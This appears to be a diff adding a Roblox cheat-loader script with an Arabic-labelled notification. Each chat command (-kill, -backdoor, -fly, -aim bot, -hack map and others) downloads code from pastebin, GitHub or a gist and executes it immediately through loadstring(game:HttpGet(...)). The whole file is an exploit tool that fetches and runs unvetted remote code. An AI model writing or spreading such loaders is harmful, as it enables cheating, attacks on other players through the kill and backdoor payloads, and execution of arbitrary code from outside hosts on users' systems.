@@ -1,0 +1,74 @@
+	local Players = game:GetService("Players")
+	game.StarterGui:SetCore("SendNotification", {
+		Title = " اكتب-ronaldo الاوامر لأضهار"; 
+		Text = "-kill / -backdoor - fly"; 
+		Icon = "rbxassetid://13395962812"; 
+		Duration = 20; 
+	})
+	local function chatted(msg)
+		if msg == "-fly" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/0DE4GVqg"))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+
+	local Players = game:GetService("Players")
+
+	local function chatted(msg)
+		if msg == "-kill" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/p01JvSJp"))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-backdoor" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/jBdvCHnv"))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-TP" then
+		    loadstring(game:HttpGet("https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/0ed51ac94057d2d9a9f00e1b037b9011c76ca54a/tpGUI", true))()
+     end
+   end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-camera" then
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/CCTV%20Camera'))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-aim bot" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U"))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-Chat" then
+			loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
+		end
+	end
+
+	Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-hack map" then
+			loadstring(game:HttpGet(('https://github.com/Ndora1/Ndora1/raw/main/hakedbnos'),true))()
+		end
+	end
+	
+Players.LocalPlayer.Chatted:Connect(chatted)
+	local function chatted(msg)
+		if msg == "-ronaldo" then
+			loadstring(game:HttpGet("https://pastebin.com/raw/kAYR3ZXs"))()
+   end
+ end
+	Players.LocalPlayer.Chatted:Connect(chatted)
+
+	print("شغال")
